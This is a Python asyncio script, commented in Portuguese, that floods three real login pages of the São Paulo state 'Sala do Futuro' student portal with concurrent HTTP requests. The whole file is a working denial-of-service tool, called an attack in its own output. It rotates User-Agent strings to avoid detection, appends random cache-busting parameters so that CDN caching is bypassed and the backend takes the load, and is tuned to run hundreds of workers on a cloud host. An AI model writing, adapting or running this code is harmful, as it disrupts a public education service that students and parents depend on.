import asyncio
import aiohttp
import random
import time
import os
import signal
import sys

# --- CONFIGURAÇÕES ---
TARGETS = [
    "https://saladofuturo.educacao.sp.gov.br/login-alunos",
    "https://saladofuturo.educacao.sp.gov.br/escolha-de-perfil",
    "https://saladofuturo.educacao.sp.gov.br/login-responsaveis-gov"
]

# Ajuste WORKERS conforme o plano do Railway (512MB RAM é o padrão gratuito)
# 150 workers por URL = 450 workers totais. É agressivo para 512MB.
# Se der erro de memória, reduza para 50.
WORKERS_PER_TARGET = int(os.getenv("WORKERS_PER_TARGET", "50"))
TOTAL_WORKERS = WORKERS_PER_TARGET * len(TARGETS)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

class Stats:
    def __init__(self):
        self.requests = 0
        self.errors = 0
        self.start_time = time.time()

    def get_rps(self):
        return self.requests / (time.time() - self.start_time) if time.time() > self.start_time else 0

stats = Stats()
stop_event = asyncio.Event()

async def attack_worker(session, target, worker_id):
    """
    Worker que ataca uma URL específica.
    A rotação de User-Agent e Cache-Buster é feita por request.
    """
    headers_base = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive'
    }
    
    while not stop_event.is_set():
        try:
            headers = headers_base.copy()
            headers['User-Agent'] = random.choice(USER_AGENTS)
            
            # Cache buster para evitar que o CDNs (Cloudflare/Akamai) cacheiem a resposta
            # e para forçar o backend a processar
            cache_buster = f"?_cb={random.randint(100000, 999999)}"
            separator = '&' if '?' in target else '?'
            url = f"{target}{separator}{cache_buster}"

            # Timeout de 10s para não travar o worker em conexões lentas
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                # Leitura obrigatória para liberar o socket
                await resp.read()
                stats.requests += 1
                if resp.status >= 400:
                    stats.errors += 1
        except asyncio.CancelledError:
            break
        except Exception as e:
            stats.errors += 1
            # Evita log spam em caso de erros constantes (ex: DNS failure)
            if stats.errors % 100 == 0:
                print(f"[ERROR] Worker {worker_id} falhou {stats.errors}x. Último erro: {type(e).__name__}")

async def monitor_stats():
    """
    Imprime estatísticas a cada 5 segundos para o Railway Logs.
    """
    while not stop_event.is_set():
        await asyncio.sleep(5)
        rps = stats.get_rps()
        uptime = int(time.time() - stats.start_time)
        h, r = divmod(uptime, 3600)
        m, s = divmod(r, 60)
        print(f"[STATS] Uptime: {h:02d}:{m:02d}:{s:02d} | RPS: {rps:.2f} | Total Reqs: {stats.requests} | Errors: {stats.errors}")

async def main():
    print(f"[INIT] Iniciando Distributed Stressor.")
    print(f"[INIT] Alvos: {len(TARGETS)} URLs")
    print(f"[INIT] Workers por alvo: {WORKERS_PER_TARGET} (Total: {TOTAL_WORKERS})")
    
    # Connector otimizado para alta concorrência
    connector = aiohttp.TCPConnector(
        limit=0, 
        limit_per_host=200, # Limita por host para não saturar o DNS local
        ttl_dns_cache=300,
        enable_cleanup_closed=True
    )
    
    timeout = aiohttp.ClientTimeout(total=15)
    
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = []
        worker_id = 0
        
        # Distribui workers entre os alvos
        for target in TARGETS:
            for _ in range(WORKERS_PER_TARGET):
                tasks.append(asyncio.create_task(attack_worker(session, target, worker_id)))
                worker_id += 1
        
        # Inicia o monitor de estatísticas
        monitor_task = asyncio.create_task(monitor_stats())
        
        print("[INIT] Ataque iniciado. Pressione Ctrl+C para parar.")
        
        try:
            # Mantém o loop vivo
            while True:
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        finally:
            stop_event.set()
            monitor_task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            print("[EXIT] Encerrado.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[EXIT] Interrompido pelo usuário.")